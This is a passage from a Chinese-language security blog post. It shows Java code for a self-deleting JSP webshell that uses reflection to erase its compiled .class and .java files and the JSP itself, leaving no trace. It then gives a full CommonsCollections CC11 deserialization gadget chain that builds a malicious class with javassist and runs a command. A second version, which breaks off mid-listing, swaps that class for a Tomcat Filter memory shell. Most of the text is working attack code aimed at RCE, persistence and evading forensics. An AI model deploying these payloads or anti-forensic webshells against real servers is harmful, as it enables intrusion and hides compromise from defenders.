    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
    //获取jsps属性内容
    Field jspsF = jspRuntimeContext.getClass().getDeclaredField(&#34;jsps&#34;);
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
    //获取对应的JspServletWrapper
    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    //获取ctxt属性保存的JspCompilationContext对象
    Field ctxt = jsw.getClass().getDeclaredField(&#34;ctxt&#34;);
    ctxt.setAccessible(true);
    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
    File targetFile;
    targetFile = new File(jspCompContext.getClassFileName());	//删掉jsp的.class
    targetFile.delete();
    targetFile = new File(jspCompContext.getServletJavaFileName());	//删掉jsp的java文件
    targetFile.delete();
    //删除jsp文件
    String __jspName = this.getClass().getSimpleName().replaceAll(&#34;_&#34;, &#34;.&#34;);
    String path=application.getRealPath(__jspName);
    File file = new File(path);
    file.delete();
%&gt;
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png alt=image-20220531183048214></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531185316461.png alt=image-20220531185316461>通过大量的反射修改tomcat对jsp编译时的一些设置，做到上马后删除自身jsp并跳过jsp编译为class和java文件的过程，可以完全不留痕——好！！很有精神！！！</p><h2 id=反序列化>反序列化</h2><p>虽然前面我们得到了可以删除自身的金蝉脱壳jsp，但有个灵魂拷问——如果能传jsp了为什么不直接传冰蝎？确实，实际场景/CTF中更多的是反序列化RCE，为了方便我们可能会接着上内存马，<strong>如果能再扩展一下冰蝎或哥斯拉那就更好了</strong></p><p>以CC11链为例，这是它的基本链</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ccTest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassClassPath</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.ClassPool</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javassist.CtClass</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.FileInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.FileOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Constructor</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashSet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;all&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CC11</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getBytescode</span><span style=color:#f92672>()</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 利用javassist动态创建恶意字节码
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>ClassPool</span> <span style=color:#111>pool</span> <span style=color:#f92672>=</span> <span style=color:#111>ClassPool</span><span style=color:#f92672>.</span><span style=color:#75af00>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>pool</span><span style=color:#f92672>.</span><span style=color:#75af00>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ClassClassPath</span><span style=color:#f92672>(</span><span style=color:#111>AbstractTranslet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>CtClass</span> <span style=color:#111>cc</span> <span style=color:#f92672>=</span> <span style=color:#111>pool</span><span style=color:#f92672>.</span><span style=color:#75af00>makeClass</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Cat&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>cmd</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc.exe\&#34;);&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>cc</span><span style=color:#f92672>.</span><span style=color:#75af00>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#75af00>insertBefore</span><span style=color:#f92672>(</span><span style=color:#111>cmd</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>randomClassName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;EvilCat&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>nanoTime</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>cc</span><span style=color:#f92672>.</span><span style=color:#75af00>setName</span><span style=color:#f92672>(</span><span style=color:#111>randomClassName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>cc</span><span style=color:#f92672>.</span><span style=color:#75af00>setSuperclass</span><span style=color:#f92672>(</span><span style=color:#111>pool</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>AbstractTranslet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>()));</span> <span style=color:#75715e>// 设置父类为AbstractTranslet 避免报错
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>return</span> <span style=color:#111>cc</span><span style=color:#f92672>.</span><span style=color:#75af00>toBytecode</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>fieldName</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span> <span style=color:#111>value</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>field</span> <span style=color:#f92672>=</span> <span style=color:#111>obj</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#111>fieldName</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>field</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>templates</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>getBytescode</span><span style=color:#f92672>()});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;name&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_class&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>InvokerTransformer</span> <span style=color:#111>transformer</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;asdfasdfasdf&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>],</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]);</span>	<span style=color:#75715e>// 占位
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>        <span style=color:#111>LazyMap</span> <span style=color:#111>map</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>LazyMap</span><span style=color:#f92672>)</span><span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>(),</span><span style=color:#111>transformer</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TiedMapEntry</span> <span style=color:#111>tiedmap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>map</span><span style=color:#f92672>,</span><span style=color:#111>templates</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>HashSet</span> <span style=color:#111>hashset</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashSet</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>hashset</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;foo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>HashSet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;map&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NoSuchFieldException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>HashSet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;backingMap&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>HashMap</span> <span style=color:#111>hashset_map</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>HashMap</span><span style=color:#f92672>)</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>hashset</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#111>HashMap</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;table&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NoSuchFieldException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#111>HashMap</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;elementData&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f2</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 替换key为TiedMap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>array</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>[])</span><span style=color:#111>f2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>hashset_map</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>node</span> <span style=color:#f92672>=</span> <span style=color:#111>array</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>node</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>node</span> <span style=color:#f92672>=</span> <span style=color:#111>array</span><span style=color:#f92672>[</span><span style=color:#111>1</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>keyField</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>node</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;key&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>tiedmap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>keyField</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;java.util.MapEntry&#34;</span><span style=color:#f92672>).</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;key&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>keyField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>keyField</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>node</span><span style=color:#f92672>,</span><span style=color:#111>tiedmap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// 替换 防止生成payload的时候就触发rce
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformer</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iMethodName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>outputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>FileOutputStream</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;./cc11&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>outputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>hashset</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>outputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#111>ObjectInputStream</span> <span style=color:#111>inputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>FileInputStream</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;./cc11&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>inputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>具体的我就不多分析了，可以近似为CC2+CC6，用TemplatestImpl加载字节码，恶意类由javassist生成</p><p>如何扩展这个看起来只能执行单句指令的简易poc？简单，我们将tomcat Filter内存马部分单独写一份TomcatInject.java文件，替换掉这里的<code>getBytescode</code>，让它不要自己生成恶意类了，直接读取TomcatInject.class的字节码即可</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ccTest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.*</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashSet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;all&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CC11Template</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>bytes</span> <span style=color:#f92672>=</span> <span style=color:#111>getBytes</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]</span> <span style=color:#111>targetByteCodes</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>bytes</span><span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>templates</span> <span style=color:#f92672>=</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f0</span> <span style=color:#f92672>=</span> <span style=color:#111>templates</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span><span style=color:#111>targetByteCodes</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span> <span style=color:#f92672>=</span> <span style=color:#111>templates</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;_name&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;name&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span> <span style=color:#f92672>=</span> <span style=color:#111>templates</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;_class&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f0</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>templates</span><span style=color:#f92672>,</span><span style=color:#00a8c8>null</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 利用反射调用 templates 中的 newTransformer 方法
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>InvokerTransformer</span> <span style=color:#111>transformer</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;asdfasdfasdf&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>],</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>HashMap</span> <span style=color:#111>innermap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>LazyMap</span> <span style=color:#111>map</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>LazyMap</span><span style=color:#f92672>)</span><span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innermap</span><span style=color:#f92672>,</span><span style=color:#111>transformer</span><span style=color:#f92672>);</span>
